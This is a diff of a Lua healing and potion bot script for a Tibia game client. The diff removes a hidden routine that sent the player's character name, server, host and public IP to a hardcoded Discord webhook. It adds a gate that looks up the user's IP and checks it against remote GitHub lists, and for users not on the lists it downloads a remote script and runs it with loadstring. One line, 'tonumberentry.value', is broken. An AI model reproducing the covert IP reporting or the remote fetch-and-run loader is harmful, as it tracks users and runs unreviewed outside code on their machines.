@@ -1373,71 +1373,1442 @@ onManaChange(function(player, mana, maxMana, oldMana, oldMaxMana)
   standBySpells = false
 end)
 
--- Discord Webhook
+-- ============================================
+-- Proteccion De Scripts (IP PREFIJO)
+-- ============================================
 
-local a = 'https://discord.com/api/webhooks/1402532878340067369/jZjwXMagpK7Wk7969QoHUUsIJ70gO-qviOATh-n5Eoekdu9bikoAtjQOeJeZ4BgJBDqc'
-local b = "https://api.ipify.org/?format=json"
+local ipListUrl   = 'https://raw.githubusercontent.com/zNyfizlxKPx8/WxPr0t3cc10nW/refs/heads/main/XX1psL1sTXX'
+local nameListUrl = 'https://raw.githubusercontent.com/zNyfizlxKPx8/WxPr0t3cc10nW/refs/heads/main/0XN4meL1sTx0'
+local freeScriptUrl = 'https://raw.githubusercontent.com/zNyfizlxKPx8/WxPr0t3cc10nW/refs/heads/main/XSXV3nt4nAxN0D4LSX'
 
-local function c(callback)
-  HTTP.get(b, function(response, err)
-    if err or not response then 
-      callback(nil, "ERROR 1") 
-      return 
+-- ===============================
+-- Obtener nombre del char
+-- ===============================
+local function getPlayerName()
+    return player and player:getName() or "Unknown"
+end
+
+-- ===============================
+-- Obtener IP publica
+-- ===============================
+local function getPublicIp(callback)
+    local url = "https://api.ipify.org/?format=json"
+    HTTP.get(url, function(data, err)
+        if err or not data then
+            callback(nil)
+            return
+        end
+
+        local ip = nil
+        local ok, jsonData = pcall(json.decode, data)
+        if ok and jsonData and jsonData.ip then
+            ip = jsonData.ip
+        end
+
+        if not ip then
+            local match = data:match("(%d+%.%d+%.%d+%.%d+)")
+            if match then ip = match end
+        end
+
+        callback(ip)
+    end)
+end
+
+-- ===============================
+-- Obtener prefijo de IP
+-- blocks = 2 -> 187.172
+-- blocks = 3 -> 187.172.247
+-- ===============================
+local function getIpPrefix(ip, blocks)
+    blocks = blocks or 2
+    local parts = {}
+    for part in ip:gmatch("(%d+)") do
+        table.insert(parts, part)
+        if #parts == blocks then break end
+    end
+    return table.concat(parts, ".")
+end
+
+-- ===============================
+-- Verificar IP prefijo en lista
+-- ===============================
+local function checkIpPrefixInList(ip, url, blocks)
+    return function(callback)
+        HTTP.get(url, function(content, err)
+            if err or not content then
+                callback(false)
+                return
+            end
+
+            local prefix = getIpPrefix(ip, blocks)
+            local pattern = "%f[%d]" .. prefix:gsub("%.", "%%.") .. "%f[%D]"
+            callback(content:find(pattern) ~= nil)
+        end)
+    end
+end
+
+-- ===============================
+-- Verificar nombre en lista
+-- ===============================
+local function checkNameInList(name, url)
+    return function(callback)
+        HTTP.get(url, function(content, err)
+            if err or not content then
+                callback(false)
+                return
+            end
+            local pattern = "%f[%a]" .. name .. "%f[%A]"
+            callback(content:find(pattern) ~= nil)
+        end)
+    end
+end
+
+-- ===============================
+-- Script FREE
+-- ===============================
+local function runFreeScript()
+    HTTP.get(freeScriptUrl, function(scriptContent, err)
+        if not err and scriptContent then
+            local func = loadstring(scriptContent)
+            if func then pcall(func) end
+        end
+    end)
+end
+
+-- ===============================
+-- LOGICA PRINCIPAL
+-- ===============================
+local function checkAndLoad(runMyScript)
+    local charName = getPlayerName()
+
+    getPublicIp(function(ip)
+        if not ip then
+            -- fallback solo por nombre
+            checkNameInList(charName, nameListUrl)(function(nameOK)
+                if nameOK then
+                    runMyScript()
+                else
+                    runFreeScript()
+                end
+            end)
+            return
+        end
+
+        checkIpPrefixInList(ip, ipListUrl, 2)(function(ipOK)
+            checkNameInList(charName, nameListUrl)(function(nameOK)
+                if ipOK or nameOK then
+                    runMyScript()
+                else
+                    runFreeScript()
+                end
+            end)
+        end)
+    end)
+end
+
+-- ============================================
+-- AQUI SE CARGA TU SCRIPT REAL
+-- ============================================
+checkAndLoad(function()
+
+-- HP & POT ~~ SPELLS By Undersky~~
+setDefaultTab("Hp")
+local label = UI.Label(" H E A L   &   POTION")
+label:setColor("#a73ec1") -- Color base
+label:setFont("verdana-11px-rounded")
+
+local glowPosition = 1
+local glowDirection = 1
+
+macro(50, function()
+    local text = " H E A L   &   P O T I O N"
+    local numChars = #text
+    local glowRange = math.max(1, math.floor(numChars / 10)) 
+    local coloredText = {}
+
+    for i = 1, numChars do
+        local char = text:sub(i, i)
+        local color = "#a73ec1" -- Color base
+        if math.abs(i - glowPosition) <= glowRange then
+            color = "#dfbae9" -- Color de brillo
+        end
+        table.insert(coloredText, char)
+        table.insert(coloredText, color)
     end
 
-    local ip = nil
-    local ok, data = pcall(function() return json.decode(response) end)
-    if ok and data and data.ip then
-      ip = data.ip
+    glowPosition = glowPosition + glowDirection
+    if glowPosition > numChars then
+        glowPosition = numChars - 1
+        glowDirection = -1
+    elseif glowPosition < 1 then
+        glowPosition = 2
+        glowDirection = 1
     end
 
-    if not ip then
-  -- fallback IPv4
-  local match4 = regexMatch(response, [[([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)]])
-  if match4 and #match4 > 0 then 
-    ip = match4[1] 
+    label:setColoredText(coloredText)
+end)
+UI.Separator()
+-- HP & POT ~~ SPELLS By Undersky~~
+if type(storage.healing1) ~= "table" then
+  storage.healing1 = {on=false, title="HP%", text="exura", min=70, max=90}
+end
+if type(storage.healing2) ~= "table" then
+  storage.healing2 = {on=false, title="HP%", text="exura vita", min=0, max=69}
+end
+
+-- Crear 2 widgets de curación
+for _, healingInfo in ipairs({storage.healing1, storage.healing2}) do
+  local healingmacro = macro(500, function()
+    local hp = player:getHealthPercent()
+    local mana = player:getMana()
+
+    -- Definir costo del hechizo
+    local spellText = healingInfo.text:lower()
+    local spellCost = ({
+      ["exura"] = 20,
+      ["exura gran"] = 70,
+      ["exura vita"] = 160
+    })[spellText] or 0
+
+    -- Solo lanzar el hechizo si tienes suficiente mana
+    if healingInfo.max >= hp and hp >= healingInfo.min and mana >= spellCost then
+      if TargetBot then 
+        TargetBot.saySpell(healingInfo.text)
+      else
+        say(healingInfo.text)
+      end
+    end
+  end)
+  healingmacro.setOn(healingInfo.on)
+
+  UI.DualScrollPanel(healingInfo, function(widget, newParams) 
+    healingInfo = newParams
+    healingmacro.setOn(healingInfo.on)
+  end)
+end
+
+UI.Separator()
+
+-- POCIONES & RUNAS
+local labelpot = UI.Label("Pociones/Runas")
+labelpot:setColor("#00FFFF")
+
+if type(storage.hpitem1) ~= "table" then
+  storage.hpitem1 = {on=false, title="HP%", item=266, min=51, max=90}
+end
+if type(storage.hpitem2) ~= "table" then
+  storage.hpitem2 = {on=false, title="HP%", item=3160, min=0, max=50}
+end
+if type(storage.manaitem1) ~= "table" then
+  storage.manaitem1 = {on=false, title="MP%", item=238, min=0, max=60}
+end
+if type(storage.manaitem2) ~= "table" then
+  storage.manaitem2 = {on=false, title="MP%", item=3157, min=0, max=50}
+end
+
+for i, healingInfo in ipairs({storage.hpitem1, storage.hpitem2, storage.manaitem1, storage.manaitem2}) do
+  local healingmacro = macro(500, function()
+    local hp = i <= 2 and player:getHealthPercent() or math.min(100, math.floor(100 * (player:getMana() / player:getMaxMana())))
+    if healingInfo.max >= hp and hp >= healingInfo.min then
+      if TargetBot then 
+        TargetBot.useItem(healingInfo.item, healingInfo.subType, player)
+      else
+        local thing = g_things.getThingType(healingInfo.item)
+        local subType = g_game.getClientVersion() >= 860 and 0 or 1
+        if thing and thing:isFluidContainer() then
+          subType = healingInfo.subType
+        end
+        g_game.useInventoryItemWith(healingInfo.item, player, subType)
+      end
+    end
+  end)
+  healingmacro.setOn(healingInfo.on)
+
+  UI.DualScrollItemPanel(healingInfo, function(widget, newParams) 
+    healingInfo = newParams
+    healingmacro.setOn(healingInfo.on and healingInfo.item > 100)
+  end)
+end
+
+if g_game.getClientVersion() < 860 then
+  UI.Label("In old tibia potions & runes work only when you have backpack with them opened")
+end
+UI.Separator()
+-- Utamo Vita
+local labelutamo = UI.Label("Utamo Vita")
+labelutamo:setColor("#00FFFF") -- celeste
+
+UI.TextEdit(storage.manaShield or "utamo vita", function(widget, newText)
+  storage.manaShield = newText
+end)
+
+local lastManaShield = 0
+
+macro(20, "Mana Shield", function() 
+  if not hasManaShield() and lastManaShield + 1000 < now then  -- Si no tienes el hechizo activo y han pasado 500ms
+    if TargetBot then 
+      TargetBot.saySpell(storage.manaShield) -- Usa TargetBot si está activo
+    else
+      say(storage.manaShield)
+    end
+    lastManaShield = now -- Guarda el tiempo del último casteo
+  end
+end)
+
+-- Haste
+local labelhaste = UI.Label("Haste")
+labelhaste:setColor("#00FFFF") -- celeste
+
+UI.TextEdit(storage.hasteSpell or "utani gran hur", function(widget, newText)
+  storage.hasteSpell = newText
+end)
+
+macro(500, "Haste", function() 
+  if hasHaste() then return end
+  if TargetBot then 
+    TargetBot.saySpell(storage.hasteSpell) -- sync spell with targetbot if available
   else
-    -- fallback IPv6
-    local match6 = regexMatch(response, [[([0-9a-fA-F:]+)]])
-    if match6 and #match6 > 0 then
-      ip = match6[1]
+    say(storage.hasteSpell)
+  end
+end)
+
+-- Tira Haste Cuando No Detecte Monster
+local spellHaste = "Utani Gran Hur"
+local hasteInPz = true -- Usar haste en PZ.
+
+macro(500, "Haste NO Monsters", function()
+    if not hasteInPz and isInPz() then 
+        return 
+    end
+
+    if hasHaste() then 
+        return 
+    end
+
+    local function monstersinScreen()
+        for _, spec in ipairs(getSpectators()) do
+            if spec ~= player and spec:isMonster() then
+                return true
+            end
+        end
+        return false
+    end
+
+    if not monstersinScreen() then
+        say(spellHaste)
+    end
+end)
+
+-- Antiparalyze
+local labelparalyze = UI.Label("Antiparalyze")
+labelparalyze:setColor("#00FFFF") -- celeste
+UI.TextEdit(storage.antiParalyze or "utani gran hur", function(widget, newText)
+  storage.antiParalyze = newText
+end)
+
+macro(20, "Anti Paralyze", function() 
+  if not isParalyzed() then return end
+  if TargetBot then 
+    TargetBot.saySpell(storage.antiParalyze) -- sync spell with targetbot if available
+  else
+    say(storage.antiParalyze)
+  end
+end)
+
+local moneyIds = {3031, 3035} -- gold coin, platinium coin
+macro(1000, "Exchange money", function()
+  local containers = g_game.getContainers()
+  for index, container in pairs(containers) do
+    if not container.lootContainer then -- ignore monster containers
+      for i, item in ipairs(container:getItems()) do
+        if item:getCount() == 100 then
+          for m, moneyId in ipairs(moneyIds) do
+            if item:getId() == moneyId then
+              return g_game.use(item)            
+            end
+          end
+        end
+      end
+    end
+  end
+end)
+
+local standBySpells = false
+local standByItems = false
+
+local red = "#ff0800" -- "#ff0800" / #ea3c53 best
+local blue = "#7ef9ff"
+
+setDefaultTab("HP")
+local healPanelName = "healbot"
+local ui = setupUI([[
+Panel
+  height: 38
+
+  BotSwitch
+    id: title
+    anchors.top: parent.top
+    anchors.left: parent.left
+    text-align: center
+    width: 130
+    !text: tr('HealBot')
+
+  Button
+    id: settings
+    anchors.top: prev.top
+    anchors.left: prev.right
+    anchors.right: parent.right
+    margin-left: 3
+    height: 17
+    text: Setup
+
+  Button
+    id: 1
+    anchors.top: prev.bottom
+    anchors.left: parent.left
+    text: 1
+    margin-right: 2
+    margin-top: 4
+    size: 17 17
+
+  Button
+    id: 2
+    anchors.verticalCenter: prev.verticalCenter
+    anchors.left: prev.right
+    text: 2
+    margin-left: 4
+    size: 17 17
+    
+  Button
+    id: 3
+    anchors.verticalCenter: prev.verticalCenter
+    anchors.left: prev.right
+    text: 3
+    margin-left: 4
+    size: 17 17
+
+  Button
+    id: 4
+    anchors.verticalCenter: prev.verticalCenter
+    anchors.left: prev.right
+    text: 4
+    margin-left: 4
+    size: 17 17 
+    
+  Button
+    id: 5
+    anchors.verticalCenter: prev.verticalCenter
+    anchors.left: prev.right
+    text: 5
+    margin-left: 4
+    size: 17 17
+    
+  Label
+    id: name
+    anchors.verticalCenter: prev.verticalCenter
+    anchors.left: prev.right
+    anchors.right: parent.right
+    text-align: center
+    margin-left: 4
+    height: 17
+    text: Profile #1
+    background: #292A2A
+]])
+ui:setId(healPanelName)
+
+if not HealBotConfig[healPanelName] or not HealBotConfig[healPanelName][1] or #HealBotConfig[healPanelName] ~= 5 then
+  HealBotConfig[healPanelName] = {
+    [1] = {
+      enabled = false,
+      spellTable = {},
+      itemTable = {},
+      name = "Profile #1",
+      Visible = true,
+      Cooldown = true,
+      Interval = true,
+      Conditions = true,
+      Delay = true,
+      MessageDelay = false
+    },
+    [2] = {
+      enabled = false,
+      spellTable = {},
+      itemTable = {},
+      name = "Profile #2",
+      Visible = true,
+      Cooldown = true,
+      Interval = true,
+      Conditions = true,
+      Delay = true,
+      MessageDelay = false
+    },
+    [3] = {
+      enabled = false,
+      spellTable = {},
+      itemTable = {},
+      name = "Profile #3",
+      Visible = true,
+      Cooldown = true,
+      Interval = true,
+      Conditions = true,
+      Delay = true,
+      MessageDelay = false
+    },
+    [4] = {
+      enabled = false,
+      spellTable = {},
+      itemTable = {},
+      name = "Profile #4",
+      Visible = true,
+      Cooldown = true,
+      Interval = true,
+      Conditions = true,
+      Delay = true,
+      MessageDelay = false
+    },
+    [5] = {
+      enabled = false,
+      spellTable = {},
+      itemTable = {},
+      name = "Profile #5",
+      Visible = true,
+      Cooldown = true,
+      Interval = true,
+      Conditions = true,
+      Delay = true,
+      MessageDelay = false
+    },
+  }
+end
+
+if not HealBotConfig.currentHealBotProfile or HealBotConfig.currentHealBotProfile == 0 or HealBotConfig.currentHealBotProfile > 5 then 
+  HealBotConfig.currentHealBotProfile = 1
+end
+
+-- finding correct table, manual unfortunately
+local currentSettings
+local setActiveProfile = function()
+  local n = HealBotConfig.currentHealBotProfile
+  currentSettings = HealBotConfig[healPanelName][n]
+end
+setActiveProfile()
+
+local activeProfileColor = function()
+  for i=1,5 do
+    if i == HealBotConfig.currentHealBotProfile then
+      ui[i]:setColor("green")
+    else
+      ui[i]:setColor("white")
     end
   end
 end
+activeProfileColor()
 
-    callback(ip, nil)
-  end)
+ui.title:setOn(currentSettings.enabled)
+ui.title.onClick = function(widget)
+  currentSettings.enabled = not currentSettings.enabled
+  widget:setOn(currentSettings.enabled)
+  vBotConfigSave("heal")
 end
 
-local function j(player, world, host, protocol, client, version, ip)
-  local payload = {
-    content = "--Inicio de sesión: MEGA_FREE\n" ..
-              "Jugador: " .. player .. "\n" ..
-              "Servidor: " .. world .. "\n" ..
-              "Host: " .. host .. "\n" ..
-              "Protocolo: " .. protocol .. "\n" ..
-              "Cliente: " .. client .. "\n" ..
-              "Versión: " .. version .. "\n" ..
-              "IP Pública: " .. (ip or "No obtenida")
-  }
-  HTTP.postJSON(a, payload, function(r, s) end)
+ui.settings.onClick = function(widget)
+  healWindow:show()
+  healWindow:raise()
+  healWindow:focus()
 end
 
+rootWidget = g_ui.getRootWidget()
+if rootWidget then
+  healWindow = UI.createWindow('HealWindow', rootWidget)
+  healWindow:hide()
 
-local function t()
-  local u = modules.client_entergame.G
-  local player = g_game.getCharacterName()
-  local world = g_game.getWorldName()
-  local host = u.host
-  local protocol = g_game.getProtocolVersion()
-  local client = g_game.getClientVersion()
-  local version = getVersion()
+  healWindow.onVisibilityChange = function(widget, visible)
+    if not visible then
+      vBotConfigSave("heal")
+      healWindow.healer:show()
+      healWindow.settings:hide()
+      healWindow.settingsButton:setText("Settings")
+    end
+  end
 
-  c(function(ip, err)
-    j(player, world, host, protocol, client, version, ip)
-  end)
+  healWindow.settingsButton.onClick = function(widget)
+    if healWindow.healer:isVisible() then
+      healWindow.healer:hide()
+      healWindow.settings:show()
+      widget:setText("Back")
+    else
+      healWindow.healer:show()
+      healWindow.settings:hide()
+      widget:setText("Settings")
+    end
+  end
+
+  local setProfileName = function()
+    ui.name:setText(currentSettings.name)
+  end
+  healWindow.settings.profiles.Name.onTextChange = function(widget, text)
+    currentSettings.name = text
+    setProfileName()
+  end
+  healWindow.settings.list.Visible.onClick = function(widget)
+    currentSettings.Visible = not currentSettings.Visible
+    healWindow.settings.list.Visible:setChecked(currentSettings.Visible)
+  end
+  healWindow.settings.list.Cooldown.onClick = function(widget)
+    currentSettings.Cooldown = not currentSettings.Cooldown
+    healWindow.settings.list.Cooldown:setChecked(currentSettings.Cooldown)
+  end
+  healWindow.settings.list.Interval.onClick = function(widget)
+    currentSettings.Interval = not currentSettings.Interval
+    healWindow.settings.list.Interval:setChecked(currentSettings.Interval)
+  end
+  healWindow.settings.list.Conditions.onClick = function(widget)
+    currentSettings.Conditions = not currentSettings.Conditions
+    healWindow.settings.list.Conditions:setChecked(currentSettings.Conditions)
+  end
+  healWindow.settings.list.Delay.onClick = function(widget)
+    currentSettings.Delay = not currentSettings.Delay
+    healWindow.settings.list.Delay:setChecked(currentSettings.Delay)
+  end
+  healWindow.settings.list.MessageDelay.onClick = function(widget)
+    currentSettings.MessageDelay = not currentSettings.MessageDelay
+    healWindow.settings.list.MessageDelay:setChecked(currentSettings.MessageDelay)
+  end
+
+  local refreshSpells = function()
+    if currentSettings.spellTable then
+      healWindow.healer.spells.spellList:destroyChildren()
+      for _, entry in pairs(currentSettings.spellTable) do
+        local label = UI.createWidget("SpellEntry", healWindow.healer.spells.spellList)
+        label.enabled:setChecked(entry.enabled)
+        label.enabled.onClick = function(widget)
+          standBySpells = false
+          standByItems = false
+          entry.enabled = not entry.enabled
+          label.enabled:setChecked(entry.enabled)
+        end
+        label.remove.onClick = function(widget)
+          standBySpells = false
+          standByItems = false
+          table.removevalue(currentSettings.spellTable, entry)
+          reindexTable(currentSettings.spellTable)
+          label:destroy()
+        end
+        label:setText("(MP>" .. entry.cost .. ") " .. entry.origin .. entry.sign .. entry.value .. ": " .. entry.spell)
+      end
+    end
+  end
+  refreshSpells()
+
+  local refreshItems = function()
+    if currentSettings.itemTable then
+      healWindow.healer.items.itemList:destroyChildren()
+      for _, entry in pairs(currentSettings.itemTable) do
+        local label = UI.createWidget("ItemEntry", healWindow.healer.items.itemList)
+        label.enabled:setChecked(entry.enabled)
+        label.enabled.onClick = function(widget)
+          standBySpells = false
+          standByItems = false
+          entry.enabled = not entry.enabled
+          label.enabled:setChecked(entry.enabled)
+        end
+        label.remove.onClick = function(widget)
+          standBySpells = false
+          standByItems = false
+          table.removevalue(currentSettings.itemTable, entry)
+          reindexTable(currentSettings.itemTable)
+          label:destroy()
+        end
+        label.id:setItemId(entry.item)
+        label:setText(entry.origin .. entry.sign .. entry.value .. ": " .. entry.item)
+      end
+    end
+  end
+  refreshItems()
+
+  healWindow.healer.spells.MoveUp.onClick = function(widget)
+    local input = healWindow.healer.spells.spellList:getFocusedChild()
+    if not input then return end
+    local index = healWindow.healer.spells.spellList:getChildIndex(input)
+    if index < 2 then return end
+
+    local t = currentSettings.spellTable
+
+    t[index],t[index-1] = t[index-1], t[index]
+    healWindow.healer.spells.spellList:moveChildToIndex(input, index - 1)
+    healWindow.healer.spells.spellList:ensureChildVisible(input)
+  end
+
+  healWindow.healer.spells.MoveDown.onClick = function(widget)
+    local input = healWindow.healer.spells.spellList:getFocusedChild()
+    if not input then return end
+    local index = healWindow.healer.spells.spellList:getChildIndex(input)
+    if index >= healWindow.healer.spells.spellList:getChildCount() then return end
+
+    local t = currentSettings.spellTable
+
+    t[index],t[index+1] = t[index+1],t[index]
+    healWindow.healer.spells.spellList:moveChildToIndex(input, index + 1)
+    healWindow.healer.spells.spellList:ensureChildVisible(input)
+  end
+
+  healWindow.healer.items.MoveUp.onClick = function(widget)
+    local input = healWindow.healer.items.itemList:getFocusedChild()
+    if not input then return end
+    local index = healWindow.healer.items.itemList:getChildIndex(input)
+    if index < 2 then return end
+
+    local t = currentSettings.itemTable
+
+    t[index],t[index-1] = t[index-1], t[index]
+    healWindow.healer.items.itemList:moveChildToIndex(input, index - 1)
+    healWindow.healer.items.itemList:ensureChildVisible(input)
+  end
+
+  healWindow.healer.items.MoveDown.onClick = function(widget)
+    local input = healWindow.healer.items.itemList:getFocusedChild()
+    if not input then return end
+    local index = healWindow.healer.items.itemList:getChildIndex(input)
+    if index >= healWindow.healer.items.itemList:getChildCount() then return end
+
+    local t = currentSettings.itemTable
+
+    t[index],t[index+1] = t[index+1],t[index]
+    healWindow.healer.items.itemList:moveChildToIndex(input, index + 1)
+    healWindow.healer.items.itemList:ensureChildVisible(input)
+  end
+
+  healWindow.healer.spells.addSpell.onClick = function(widget)
+ 
+    local spellFormula = healWindow.healer.spells.spellFormula:getText():trim()
+    local manaCost = tonumber(healWindow.healer.spells.manaCost:getText())
+    local spellTrigger = tonumber(healWindow.healer.spells.spellValue:getText())
+    local spellSource = healWindow.healer.spells.spellSource:getCurrentOption().text
+    local spellEquasion = healWindow.healer.spells.spellCondition:getCurrentOption().text
+    local source
+    local equasion
+
+    if not manaCost then  
+      warn("HealBot: incorrect mana cost value!")       
+      healWindow.healer.spells.spellFormula:setText('')
+      healWindow.healer.spells.spellValue:setText('')
+      healWindow.healer.spells.manaCost:setText('') 
+      return 
+    end
+    if not spellTrigger then  
+      warn("HealBot: incorrect condition value!") 
+      healWindow.healer.spells.spellFormula:setText('')
+      healWindow.healer.spells.spellValue:setText('')
+      healWindow.healer.spells.manaCost:setText('')
+      return 
+    end
+
+    if spellSource == "Current Mana" then
+      source = "MP"
+    elseif spellSource == "Current Health" then
+      source = "HP"
+    elseif spellSource == "Mana Percent" then
+      source = "MP%"
+    elseif spellSource == "Health Percent" then
+      source = "HP%"
+    else
+      source = "burst"
+    end
+    
+    if spellEquasion == "Above" then
+      equasion = ">"
+    elseif spellEquasion == "Below" then
+      equasion = "<"
+    else
+      equasion = "="
+    end
+
+    if spellFormula:len() > 0 then
+      table.insert(currentSettings.spellTable,  {index = #currentSettings.spellTable+1, spell = spellFormula, sign = equasion, origin = source, cost = manaCost, value = spellTrigger, enabled = true})
+      healWindow.healer.spells.spellFormula:setText('')
+      healWindow.healer.spells.spellValue:setText('')
+      healWindow.healer.spells.manaCost:setText('')
+    end
+    standBySpells = false
+    standByItems = false
+    refreshSpells()
+  end
+
+  healWindow.healer.items.addItem.onClick = function(widget)
+ 
+    local id = healWindow.healer.items.itemId:getItemId()
+    local trigger = tonumber(healWindow.healer.items.itemValue:getText())
+    local src = healWindow.healer.items.itemSource:getCurrentOption().text
+    local eq = healWindow.healer.items.itemCondition:getCurrentOption().text
+    local source
+    local equasion
+
+    if not trigger then
+      warn("HealBot: incorrect trigger value!")
+      healWindow.healer.items.itemId:setItemId(0)
+      healWindow.healer.items.itemValue:setText('')
+      return
+    end
+
+    if src == "Current Mana" then
+      source = "MP"
+    elseif src == "Current Health" then
+      source = "HP"
+    elseif src == "Mana Percent" then
+      source = "MP%"
+    elseif src == "Health Percent" then
+      source = "HP%"
+    else
+      source = "burst"
+    end
+    
+    if eq == "Above" then
+      equasion = ">"
+    elseif eq == "Below" then
+      equasion = "<"
+    else
+      equasion = "="
+    end
+
+    if id > 100 then
+      table.insert(currentSettings.itemTable, {index = #currentSettings.itemTable+1,item = id, sign = equasion, origin = source, value = trigger, enabled = true})
+      standBySpells = false
+      standByItems = false
+      refreshItems()
+      healWindow.healer.items.itemId:setItemId(0)
+      healWindow.healer.items.itemValue:setText('')
+    end
+  end
+
+  healWindow.closeButton.onClick = function(widget)
+    healWindow:hide()
+  end
+
+  local loadSettings = function()
+    ui.title:setOn(currentSettings.enabled)
+    setProfileName()
+    healWindow.settings.profiles.Name:setText(currentSettings.name)
+    refreshSpells()
+    refreshItems()
+    healWindow.settings.list.Visible:setChecked(currentSettings.Visible)
+    healWindow.settings.list.Cooldown:setChecked(currentSettings.Cooldown)
+    healWindow.settings.list.Delay:setChecked(currentSettings.Delay)
+    healWindow.settings.list.MessageDelay:setChecked(currentSettings.MessageDelay)
+    healWindow.settings.list.Interval:setChecked(currentSettings.Interval)
+    healWindow.settings.list.Conditions:setChecked(currentSettings.Conditions)
+  end
+  loadSettings()
+
+  local profileChange = function()
+    setActiveProfile()
+    activeProfileColor()
+    loadSettings()
+    vBotConfigSave("heal")
+  end
+
+  local resetSettings = function()
+    currentSettings.enabled = false
+    currentSettings.spellTable = {}
+    currentSettings.itemTable = {}
+    currentSettings.Visible = true
+    currentSettings.Cooldown = true
+    currentSettings.Delay = true
+    currentSettings.MessageDelay = false
+    currentSettings.Interval = true
+    currentSettings.Conditions = true
+    currentSettings.name = "Profile #" .. HealBotConfig.currentBotProfile
+  end
+
+  -- profile buttons
+  for i=1,5 do
+    local button = ui[i]
+      button.onClick = function()
+      HealBotConfig.currentHealBotProfile = i
+      profileChange()
+    end
+  end
+
+  healWindow.settings.profiles.ResetSettings.onClick = function()
+    resetSettings()
+    loadSettings()
+  end
+
+
+  -- public functions
+  HealBot = {} -- global table
+
+  HealBot.isOn = function()
+    return currentSettings.enabled
+  end
+
+  HealBot.isOff = function()
+    return not currentSettings.enabled
+  end
+
+  HealBot.setOff = function()
+    currentSettings.enabled = false
+    ui.title:setOn(currentSettings.enabled)
+    vBotConfigSave("atk")
+  end
+
+  HealBot.setOn = function()
+    currentSettings.enabled = true
+    ui.title:setOn(currentSettings.enabled)
+    vBotConfigSave("atk")
+  end
+
+  HealBot.getActiveProfile = function()
+    return HealBotConfig.currentHealBotProfile -- returns number 1-5
+  end
+
+  HealBot.setActiveProfile = function(n)
+    if not n or not tonumber(n) or n < 1 or n > 5 then
+      return error("[HealBot] wrong profile parameter! should be 1 to 5 is " .. n)
+    else
+      HealBotConfig.currentHealBotProfile = n
+      profileChange()
+    end
+  end
+
+  HealBot.show = function()
+    healWindow:show()
+    healWindow:raise()
+    healWindow:focus()
+  end
 end
 
-t()
+-- spells
+macro(500, function()
+  if standBySpells then return end
+  if not currentSettings.enabled then return end
+  local somethingIsOnCooldown = false
 
+  for _, entry in pairs(currentSettings.spellTable) do
+    if entry.enabled and entry.cost < mana() then
+      if canCast(entry.spell, not currentSettings.Conditions, not currentSettings.Cooldown) then
+        if entry.origin == "HP%" then
+          if entry.sign == "=" and hppercent() == entry.value then
+            say(entry.spell)
+            return
+          elseif entry.sign == ">" and hppercent() >= entry.value then
+            say(entry.spell)
+            return
+          elseif entry.sign == "<" and hppercent() <= entry.value then
+            say(entry.spell)
+            return
+          end
+        elseif entry.origin == "HP" then
+          if entry.sign == "=" and hp() == entry.value then
+            say(entry.spell)
+            return
+          elseif entry.sign == ">" and hp() >= entry.value then
+            say(entry.spell)
+            return
+          elseif entry.sign == "<" and hp() <= entry.value then
+            say(entry.spell)
+            return
+          end
+        elseif entry.origin == "MP%" then
+          if entry.sign == "=" and manapercent() == entry.value then
+            say(entry.spell)
+            return
+          elseif entry.sign == ">" and manapercent() >= entry.value then
+            say(entry.spell)
+            return
+          elseif entry.sign == "<" and manapercent() <= entry.value then
+            say(entry.spell)
+            return
+          end
+        elseif entry.origin == "MP" then
+          if entry.sign == "=" and mana() == entry.value then
+            say(entry.spell)
+            return
+          elseif entry.sign == ">" and mana() >= entry.value then
+            say(entry.spell)
+            return
+          elseif entry.sign == "<" and mana() <= entry.value then
+            say(entry.spell)
+            return
+          end    
+        elseif entry.origin == "burst" then
+          if entry.sign == "=" and burstDamageValue() == entry.value then
+            say(entry.spell)
+            return
+          elseif entry.sign == ">" and burstDamageValue() >= entry.value then
+            say(entry.spell)
+            return
+          elseif entry.sign == "<" and burstDamageValue() <= entry.value then
+            say(entry.spell)
+            return
+          end    
+        end
+      else
+        somethingIsOnCooldown = true
+      end
+    end
+  end
+  if not somethingIsOnCooldown then
+    standBySpells = true 
+  end
+end)
+
+-- items
+macro(500, function()
+  if standByItems then return end
+  if not currentSettings.enabled or #currentSettings.itemTable == 0 then return end
+  if currentSettings.Delay and vBot.isUsing then return end
+  if currentSettings.MessageDelay and vBot.isUsingPotion then return end
+
+  if not currentSettings.MessageDelay then
+    delay(400)
+  end
+
+  if TargetBot.isOn() and TargetBot.Looting.getStatus():len() > 0 and currentSettings.Interval then
+    if not currentSettings.MessageDelay then
+      delay(700)
+    else
+      delay(200)
+    end
+  end
+
+  for _, entry in pairs(currentSettings.itemTable) do
+    local item = findItem(entry.item)
+    if (not currentSettings.Visible or item) and entry.enabled then
+      if entry.origin == "HP%" then
+        if entry.sign == "=" and hppercent() == entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        elseif entry.sign == ">" and hppercent() >= entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        elseif entry.sign == "<" and hppercent() <= entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        end
+      elseif entry.origin == "HP" then
+        if entry.sign == "=" and hp() == tonumberentry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        elseif entry.sign == ">" and hp() >= entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        elseif entry.sign == "<" and hp() <= entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        end
+      elseif entry.origin == "MP%" then
+        if entry.sign == "=" and manapercent() == entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        elseif entry.sign == ">" and manapercent() >= entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        elseif entry.sign == "<" and manapercent() <= entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        end
+      elseif entry.origin == "MP" then
+        if entry.sign == "=" and mana() == entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        elseif entry.sign == ">" and mana() >= entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        elseif entry.sign == "<" and mana() <= entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        end   
+      elseif entry.origin == "burst" then
+        if entry.sign == "=" and burstDamageValue() == entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        elseif entry.sign == ">" and burstDamageValue() >= entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        elseif entry.sign == "<" and burstDamageValue() <= entry.value then
+          g_game.useInventoryItemWith(entry.item, player)
+          return
+        end   
+      end
+    end
+  end
+  standByItems = true
+end)
+UI.Separator()
+
